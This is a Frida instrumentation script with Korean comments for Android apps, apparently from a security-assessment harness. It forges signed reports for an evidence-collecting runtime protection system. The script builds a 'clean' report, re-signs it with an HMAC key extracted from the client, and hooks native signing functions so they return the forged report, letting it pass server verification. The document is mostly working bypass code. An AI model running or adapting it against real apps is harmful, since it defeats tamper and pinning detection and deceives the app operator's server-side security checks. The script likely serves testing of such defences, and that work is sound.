/*
 * report-forge.js — ⓑ 서명 리포트 위조 (Frida 16.2.1)
 * ---------------------------------------------------------------------------
 * 증거수집형 RASP의 신뢰근거(서명 키)가 클라이언트에 상수로 노출됐을 때의 경로.
 * clean evidence로 리포트를 조립하고 **추출한 HMAC 키로 직접 재서명**해, 서버의
 * claim 검증을 통과시킨다. collector 후킹이 어려워도(앱 밖에서도) 성립할 수 있는 경로.
 *
 * ❗ 서버가 리포트를 실제 검증하는 구조일 때 이 경로가 핵심(검증 안 하면 애초에 위조 불필요).
 * ❗ 버전 16.2.1 API. frida-server도 16.2.1. _bootstrap.js 패턴 재사용 가능.
 * 실행: frida -U -f <패키지> -l report-forge.js   /   frida -U -n "<앱이름>" -l report-forge.js
 * 매핑 criterion: 증거수집형 RASP 전반, NET-PIN-01/02(피닝 포함 서명 리포트), 서명키 유출.
 * ---------------------------------------------------------------------------
 */

'use strict';

// ── 파라미터 (대상 노트에서 채운다) ─────────────────────────────────────────
var TARGET_SO = 'libXXX.so';      // 예시: 'libscn00monitor.so'
var VERBOSE   = true;

// 추출한 대칭(HMAC) 키. 예시(scn00): 'SCN00-monitor-hmac-key-v1-eqstlb'
var HMAC_KEY  = 'REPLACE-WITH-EXTRACTED-HMAC-KEY';

// 리포트 payload 포맷. 예시(scn00): 'scenario|arg|flag|evidence',
// 서명 출력 포맷: base64(payload) + '.' + hex(hmacSha256(payload))
// clean 상태 = flag '0', evidence 빈 문자열.
var REPORT = {
  scenario: 'scenario00',
  arg:      '',
  flag:     '0',     // '0' = 이상 없음(clean)
  evidence: ''       // 빈 증거
};

// 위조 리포트를 반환시킬 네이티브 서명 함수(선택). 예시(scn00): 'nativeSignedReport'
// (후킹 대신 payload만 만들어 수동 전송해도 됨 — 아래 buildSignedReport 사용)
var SIGN_EXPORTS = [
  // 'nativeSignedReport',
  // 'nativeSignedReportPinning'
];

function log(m) { if (VERBOSE) console.log('[forge] ' + m); }

// ── HMAC-SHA256 서명: Java javax.crypto.Mac 사용(16.2.1 Java bridge) ─────────
function hmacSha256Hex(message, key) {
  var Mac = Java.use('javax.crypto.Mac');
  var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
  var StringCls = Java.use('java.lang.String');

  var keyBytes = StringCls.$new(key).getBytes('UTF-8');
  var msgBytes = StringCls.$new(message).getBytes('UTF-8');
  var spec = SecretKeySpec.$new(keyBytes, 'HmacSHA256');
  var mac = Mac.getInstance('HmacSHA256');
  mac.init(spec);
  var out = mac.doFinal(msgBytes);           // byte[]
  // hex 인코딩
  var hex = '';
  for (var i = 0; i < out.length; i++) {
    var b = (out[i] & 0xff).toString(16);
    hex += (b.length === 1 ? '0' : '') + b;
  }
  return hex;
}

function base64Utf8(message) {
  var StringCls = Java.use('java.lang.String');
  var Base64 = Java.use('android.util.Base64');
  var NO_WRAP = 2; // android.util.Base64.NO_WRAP
  var bytes = StringCls.$new(message).getBytes('UTF-8');
  return Base64.encodeToString(bytes, NO_WRAP);
}

// clean payload 조립 → base64(payload).hex(hmac)
function buildSignedReport() {
  var payload = [REPORT.scenario, REPORT.arg, REPORT.flag, REPORT.evidence].join('|');
  var signed = base64Utf8(payload) + '.' + hmacSha256Hex(payload, HMAC_KEY);
  log('forged report payload = ' + payload);
  log('forged signed report  = ' + signed);
  return signed;
}

// ── 네이티브 서명 함수 후킹: 반환을 위조 리포트로 교체(선택) ────────────────
function hookSignExports(forged) {
  SIGN_EXPORTS.forEach(function (name) {
    var p = Module.findExportByName(TARGET_SO, name);
    if (p === null) { log('sign export not found: ' + name); return; }
    Interceptor.attach(p, {
      onLeave: function (retval) {
        try {
          var env = Java.vm.tryGetEnv();
          // newStringUtf 결과는 이미 jstring(NativePointer) — ptr()로 감싸지 말 것.
          if (env !== null) { retval.replace(env.newStringUtf(forged)); }
          else { retval.replace(Memory.allocUtf8String(forged)); }
          log('replaced return of ' + name + ' with forged report');
        } catch (e) { log('replace error ' + name + ': ' + e); }
      }
    });
    log('hooked sign export ' + name + ' @ ' + p);
  });
}

// ── 엔트리 ───────────────────────────────────────────────────────────────
(function main() {
  if (HMAC_KEY.indexOf('REPLACE') === 0) {
    log('⚠ HMAC_KEY 미설정 — 대상 노트에서 추출한 키로 교체 필요. 서명 생략, payload만 출력.');
  }
  if (!Java.available) { log('Java VM unavailable — 서명에 Java Mac 필요'); return; }

  Java.perform(function () {
    var forged = null;
    if (HMAC_KEY.indexOf('REPLACE') !== 0) {
      forged = buildSignedReport();   // rpc로 꺼내 수동 전송하거나,
    }
    if (forged !== null && SIGN_EXPORTS.length > 0) {
      hookSignExports(forged);        // 네이티브 반환 자체를 위조로 교체.
    }
  });

  // rpc.exports: 콘솔에서 forge() 호출해 위조 리포트 문자열을 받아 수동 claim 테스트 가능.
  rpc.exports = {
    forge: function () {
      var result = null;
      Java.perform(function () { result = buildSignedReport(); });
      return result;
    }
  };
})();
